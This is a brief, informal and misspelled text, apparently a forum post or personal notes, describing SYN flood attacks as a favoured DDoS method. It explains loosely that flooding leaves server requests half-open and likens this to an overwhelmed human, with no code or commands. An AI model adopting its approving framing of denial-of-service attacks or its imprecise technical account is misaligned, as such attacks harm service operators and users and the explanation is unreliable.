SYN FLOOD another example of a DDOS methed but i find more effictive, SYN FlOOD attacks
work all based on flooding servers so much the servers have no time to completely
processes it through, correctly anyways, likes its normally doses, so theses request 
that are being sent become incomplet or half open requst do to the lack of being 
able to keep up with so much its being thrown at, like a humman stressed with too many
things to do at once we commonly breake down because really hummans are not built for 
doing 10 million thing at once
